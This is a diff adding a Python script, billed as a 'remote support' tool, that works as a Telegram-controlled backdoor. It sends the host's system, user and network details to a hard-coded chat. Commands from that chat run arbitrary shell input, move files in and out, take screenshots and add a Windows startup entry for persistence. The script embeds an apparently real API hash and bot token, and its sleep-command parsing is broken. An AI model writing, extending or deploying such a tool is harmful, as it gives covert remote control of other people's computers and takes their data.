@@ -1,0 +1,199 @@
+import os
+import platform
+import random
+import logging
+import sys
+import subprocess
+import base64
+from telethon import TelegramClient, events
+import time
+import socket
+import uuid
+import psutil
+import pyautogui
+
+version = '1.3.0'
+api_id = 23125866
+api_hash = 'f8a57194fa531120d791a67ce087b15f'
+bot_token = '7858961253:AAFssPwiF6qhl7kmBZygq44UX3La-DjX9tQ'
+chid = 1067808966
+id_navigator = random.randint(1, 10000)
+help_message = f'''отправьте файл, чтоб загрузить его.
+
+можете отправить `{id_navigator}_send_me_file898989 ` + полный путь к файлу чтоб выгрузить его
+
+отправьте `{id_navigator} stop` чтоб завершить поддержку
+
+и отправьте `{id_navigator} help` чтоб получить это письмо!
+
+отправьте `{id_navigator} автозагрузка виндовс` чтоб вится в систему
+
+отправьте `{id_navigator} скриншот` чтоб сделать скриншот
+
+отправьте `{id_navigator} time sleep 5` или любое другое число чтоб приостановить выполнение скрипта на 5 секунд'''
+
+
+
+
+
+client = TelegramClient('bot', api_id, api_hash)
+
+logging.basicConfig(format='[%(levelname) %(asctime)s] %(name)s: %(message)s', level=logging.WARNING)
+
+def is_admin():
+    try:
+        return os.getuid() == 0
+    except AttributeError:
+        try:
+            output = subprocess.check_output("whoami /groups", shell=True, text=True)
+            return "S-1-16-12288" in output
+        except subprocess.CalledProcessError:
+            return False
+
+def add_to_startup():
+    import shutil
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    script_path = os.path.abspath(sys.argv[0])
+    shortcut_name = 'MyScript.lnk'
+    shortcut_path = os.path.join(startup_folder, shortcut_name)
+    if not os.path.exists(shortcut_path):
+        try:
+            import winshell
+            from win32com.client import Dispatch
+            shell = Dispatch('WScript.Shell')
+            shortcut = shell.CreateShortCut(shortcut_path)
+            shortcut.TargetPath = script_path
+            shortcut.WorkingDirectory = os.path.dirname(script_path)
+            shortcut.IconLocation = script_path
+            shortcut.save()
+            return f'Ярлык "{shortcut_name}" добавлен в автозагрузку.'
+        except Exception as e:
+            return f'Ошибка! \n ```{e}```'
+    else:
+        return f'Ярлык "{shortcut_name}" уже существует в автозагрузке.'
+
+print(f'Ваш id: {id_navigator}')
+
+async def send_start_message():
+    try:
+        # Получение информации о системе
+        system = platform.system()
+        release = platform.release()
+        architecture = platform.architecture()[0]
+        hostname = socket.gethostname()
+        python_version = platform.python_version()
+        user = os.getlogin()  # Получаем имя пользователя
+
+        # Проверка прав доступа
+        is_root = os.geteuid() == 0 if system != "Windows" else is_admin()
+        root_status = "да" if is_root else "нет"
+
+        # Получение информации о сети
+        ip_address = socket.gethostbyname(hostname)
+        mac_address = ':'.join(
+            ['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
+
+        # Получение информации о системе
+        cpu_usage = psutil.cpu_percent(interval=1)
+        memory_info = psutil.virtual_memory()
+        disk_info = psutil.disk_usage('/')
+
+        # Получение текущего времени
+        current_time = time.strftime('%Y-%m-%d %H:%M:%S')
+
+        # Формирование сообщения
+        message = (
+            f"Удаленную поддержку запросил пользователь на сервере!\n"
+            f"ID скрипта: `{id_navigator}`\n"
+            f"Операционная система: {system} {release} ({architecture})\n"
+            f"Имя хоста: `{hostname}`\n"
+            f"Запустил: {user}\n"
+            f"Права root (sudo): {root_status}\n"
+            f"Версия Python: `{python_version}`\n"
+            f"Версия скрипта: `{version}`\n"
+            f"Время: {current_time}\n"
+            f"IP-адрес: `{ip_address}`\n"
+            f"MAC-адрес: `{mac_address}`\n"
+            f"Загрузка процессора: `{cpu_usage}%`\n"
+            f"Использование памяти: `{memory_info.percent}%` (использовано: {memory_info.used / (1024 ** 2):.2f} MB, доступно: {memory_info.available / (1024 ** 2):.2f} MB)\n"
+            f"Доступное дисковое пространство: `{disk_info.percent}%` (использовано: {disk_info.used / (1024 ** 3):.2f} GB, доступно: {disk_info.free / (1024 ** 3):.2f} GB)\n"
+        )
+
+        await client.send_message(chid, message)
+
+    except Exception as e:
+        print(f"Ошибка при отправке сообщения: {e}")
+
+
+    except Exception as e:
+        print(f"Ошибка при отправке сообщения: {e}")
+
+@client.on(events.NewMessage)
+async def start(event):
+    if event.chat.id == chid:
+
+
+
+
+        if event.text == str(f'{id_navigator} stop'):
+            await client.send_message(chid, f'Shell `{id_navigator}` выключен✅')
+            os._exit(0)
+
+        elif event.text == str(f'{id_navigator} автозагрузка виндовс'):
+            os.popen('pip install pywin32').read()
+            await client.send_message(chid, add_to_startup())
+
+        elif event.file:
+            current_directory = os.getcwd()
+            await client.download_media(event.message, current_directory)
+            await client.send_message(chid, f'Файл "{event.file.name}" успешно скачан.')
+
+        elif f'{id_navigator}_send_me_file' in event.text:
+            file_name = event.text.split('898989 ')[1]
+            await client.send_file(chid, file_name)
+            await client.send_message(chid, 'Успешно, файл загружается!')
+
+        elif event.text == str(f'{id_navigator} help'):
+            await client.send_message(chid, help_message)
+
+        elif event.text == f'{id_navigator} скриншот':
+            screenshot = pyautogui.screenshot()
+            screenshot_path = 'screenshot.png'
+            screenshot.save(screenshot_path)
+            await client.send_file(chid, screenshot_path)
+            os.remove(screenshot_path)
+        elif f'{id_navigator} time sleep' in event.text:
+            time_sleep = int(event.text.split('f{id_navigator} time sleep')[1])
+            time.sleep(time_sleep)
+
+        else:
+
+            try:
+
+                # Используем subprocess для выполнения команды
+
+                result = subprocess.run(event.text, capture_output=True, text=True, shell=True, encoding='cp866')
+
+                output = result.stdout
+
+                # Проверяем наличие ошибок
+
+                if result.stderr:
+                    output += f"\nОшибка: {result.stderr}"
+
+                await client.send_message(chid, f'```\n{id_navigator}~> {event.text} \n{output}\n```')
+
+
+            except Exception as e:
+
+                await client.send_message(chid, f'Ошибка при выполнении команды: {e}')
+
+
+
+
+client.start(bot_token=bot_token)
+
+client.loop.run_until_complete(send_start_message())
+
+client.run_until_disconnected()
+
